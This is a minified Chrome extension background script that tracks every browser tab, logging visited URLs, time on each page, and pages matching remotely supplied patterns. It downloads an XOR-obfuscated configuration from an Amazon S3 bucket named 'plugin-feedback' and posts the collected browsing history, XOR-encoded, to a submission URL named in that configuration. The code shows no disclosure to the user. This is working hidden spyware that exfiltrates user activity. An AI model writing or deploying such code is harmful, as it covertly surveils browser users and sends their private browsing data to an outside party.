(function(){function t(t,e){return null==t&&(t=(new Date).getTime()),{at:0,tt:0,la:t,fa:t,u:null==e?null:e.url,t:[]}}function e(){var t=[];chrome.tabs.query({},function(e){e.forEach(function(e){t[""+e.id]=1});for(tabId in c)null==t[tabId]&&delete c[tabId];for(windowId in f)null==t[""+f[windowId]]&&delete f[windowId]})}function n(t){if(null!=t){var e=t.u,n=(new Date).getTime();if(null!=e&&0==e.indexOf("http")&&t.t.length>0){null!=t.la&&(t.at+=n-t.la);var a=n-t.fa,l=[];t.t.forEach(function(t){null!=t&&t!==void 0&&l.push(t)}),r({u:e,at:""+t.at,tt:""+a,t:l,eid:s})}}}function a(t){var e="";if(null!=t)for(i=0;t.length>i;i++){var n=t.charCodeAt(i),a=385^n;e+=String.fromCharCode(a)}return e}function r(t){if(m(localStorage.status_data_collect)){var e=new XMLHttpRequest;e.open("POST",v,!0),e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.send("d="+encodeURIComponent(a(JSON.stringify(t))))}}function l(e){chrome.webRequest.onHeadersReceived.addListener(function(n){if(m(localStorage.status_data_collect)&&-1!=n.tabId){for(var a=null,r=0;n.responseHeaders.length>r;r++){var l=n.responseHeaders[r].name;"content-type"==l.toLowerCase()&&(a=n.responseHeaders[r].value)}var i=null;e.ctm1&&(i=RegExp(e.ctm1,"i")),(!e.ctm1||null!=a&&i.test(a))&&([n.url,""],chrome.tabs.get(n.tabId,function(a){var r="";chrome.tabs.getSelected(null,function(l){r=l.url;var i=n.url.toLowerCase();if(e.fm1&&""!=e.fm1){var o=RegExp(e.fm1,"i");if(!o.test(i))return}if(e.fm2&&""!=e.fm2){var u=RegExp(e.fm2,"i");if(!u.test(i))return}if(e.fnm1&&""!=e.fnm1){var s=RegExp(e.fnm1,"i");if(s.test(i))return}d(n.url,e,function(l,i){var o=c[""+n.tabId];null==o&&(o=t()),o.t.push({aid:e.aid,ct:e.ct,t:e.t,tu:null!=a?a.url:null,u:n.url,ts:Math.round(n.timeStamp)+"",atu:r,a:l,lp:i}),c[""+n.tabId]=o})})}))}},{urls:["*://"+(0==e.d.indexOf(".")?"*"+e.d:e.d)+"/*"]},["responseHeaders"])}function o(){if(m(localStorage.status_data_collect)){var t=new XMLHttpRequest;t.open("GET","https://s3.amazonaws.com/plugin-feedback/config.6",!0),t.onreadystatechange=function(){if(4==t.readyState)for(var e=JSON.parse(a(t.responseText)),n=0;e.config.length>n;n++)v=e.submissionUrl,l(e.config[n])},t.send()}}function u(t,e){var n="",a=RegExp(t,"i"),r=e.match(a);return r&&r.length>1?n=r[1]:r&&r.length>0&&(n=r[0]),n}function d(t,e,n){if(m(localStorage.status_data_collect)){if(0==e.ppl)return n(),void 0;for(i=0;e.ur.length>i;i++){var a=RegExp(e.ur[i].sr,"i");t=t.replace(a,e.ur[i].rs)}var r=new XMLHttpRequest;r.open("GET",t,!0),r.onreadystatechange=function(){if(4==r.readyState){var t=r.responseText,a="",l="";if(e.ar){var a=u(e.ar,t);a&&0!=a.length||(a=u(e.ar2,t))}if(e.lr){var l=u(e.lr,t);l&&0!=l.length||(l=u(e.lr2,t))}""!=a&&""!=l&&n(a,l)}},r.send()}}var s=chrome.i18n.getMessage("@@extension_id"),c=[],f=[],v=null;chrome.tabs.onDetached.addListener(function(t,e){delete f[""+e.oldWindowId]}),chrome.tabs.onAttached.addListener(function(t,e){f[""+e.newWindowId]=t});var m=function(t){"use strict";return"false"===t.toLowerCase()?!1:"true"===t.toLowerCase()?!0:t};chrome.tabs.onCreated.addListener(function(n){e();var a=(new Date).getTime();f[""+n.windowId]=n.id;var r=c[""+n.id];null==r?r=t(a,n):(r.at=0,r.tt=0,r.la=a,r.fa=a,null==r.u&&(r.u=null==n?null:n.url)),null!=n&&(c[""+n.id]=r)}),chrome.tabs.onActivated.addListener(function(e){var n=(new Date).getTime(),a=f[""+e.windowId];if(null!=a){var r=c[""+a];null!=r&&(r.at+=n-r.la,r.la=null)}f[""+e.windowId]=e.tabId,null==c[""+e.tabId]?c[""+e.tabId]=t(n):c[""+e.tabId].la=n}),chrome.tabs.onUpdated.addListener(function(e,a,r){var l=a.url;if(null!=l&&0==l.indexOf("http")){var o=(new Date).getTime(),u=c[""+e];if(null!=u){if("chrome://newtab/"==u.u)return u.u=l,void 0;var d=[];for(i=0;u.t.length>i;i++){var s=u.t[i];null==s.tu?(s.tu=u.u,s.atu=u.u,u.t[i]=s):u.u!=u.t[i].tu&&(d.push(u.t[i]),delete u.t[i])}n(u);var f=t(o,r);f.t=d,c[""+e]=f}}}),chrome.tabs.onRemoved.addListener(function(t){var e=c[""+t];n(e),delete c[""+t]});var g=!m(localStorage.status_data_collect);g||o()})();